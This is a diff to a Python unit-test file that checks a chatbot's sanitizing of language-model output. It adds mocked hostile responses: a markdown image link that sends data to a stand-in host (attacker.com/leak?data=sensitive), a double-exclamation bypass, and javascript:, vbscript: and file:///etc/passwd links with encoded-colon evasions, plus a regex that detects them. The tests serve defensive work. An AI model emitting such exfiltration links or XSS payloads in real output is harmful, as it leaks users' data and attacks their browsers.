@@ -44,22 +44,26 @@ class TestSecurity(unittest.TestCase):
     def test_output_sanitization(self, mock_post):
         mock_post.return_value.status_code = 200
         # Simulated malicious LLM output trying to exfiltrate data via image tag
+        # including a bypass attempt with multiple exclamation marks.
         mock_post.return_value.json.return_value = {
-            'response': 'Here is your data ![exfil](http://attacker.com/leak?data=sensitive)'
+            'response': 'Here is your data ![exfil](http://attacker.com/leak?data=sensitive) and !![bypass](http://attacker.com/leak)'
         }
 
         answer = ask_mistral_ollama("safe query", "safe context")
 
         # Verify that '!' is removed from the image tag
         self.assertNotIn("![exfil]", answer)
+        self.assertNotIn("!![bypass]", answer)
         self.assertIn("[exfil](http://attacker.com/leak?data=sensitive)", answer)
+        self.assertIn("[bypass](http://attacker.com/leak)", answer)
 
     @patch('bot.http_session.post')
     def test_protocol_neutralization(self, mock_post):
         mock_post.return_value.status_code = 200
         # Simulated malicious LLM output trying to use various protocols for XSS
+        # including attempts to bypass using encoded colons.
         mock_post.return_value.json.return_value = {
-            'response': 'Links: [js](javascript:a), [JS-WS](javascript :a), [vb](vbscript:a), [data](data:a), [file](file:///etc/passwd), [res](resource://a), [blob](blob:http://a)'
+            'response': 'Links: [js](javascript:a), [JS-WS](javascript :a), [vb](vbscript:a), [data](data:a), [file](file:///etc/passwd), [res](resource://a), [blob](blob:http://a), [encoded1](javascript&#x3a;a), [encoded2](javascript%3aa), [encoded3](javascript&#58;a)'
         }
 
         answer = ask_mistral_ollama("safe query", "safe context")
@@ -67,6 +71,9 @@ class TestSecurity(unittest.TestCase):
         import re
         # Check that the protocols are neutralized (prefixed with blocked-)
         self.assertIn("blocked-javascript:a", answer)
+        self.assertIn("blocked-javascript&#x3a;a", answer)
+        self.assertIn("blocked-javascript%3aa", answer)
+        self.assertIn("blocked-javascript&#58;a", answer)
         self.assertIn("blocked-vbscript:a", answer)
         self.assertIn("blocked-data:a", answer)
         self.assertIn("blocked-file:///etc/passwd", answer)
@@ -74,7 +81,7 @@ class TestSecurity(unittest.TestCase):
         self.assertIn("blocked-blob:http://a", answer)
 
         # Verify no un-blocked instances remain
-        self.assertFalse(re.search(r'(?<!blocked-)(javascript|vbscript|data|file|resource|blob)\s*:', answer, re.IGNORECASE))
+        self.assertFalse(re.search(r'(?<!blocked-)(javascript|vbscript|data|file|resource|blob)\s*(:|&#x3a;|&#58;|%3a)', answer, re.IGNORECASE))
 
 if __name__ == '__main__':
     unittest.main()
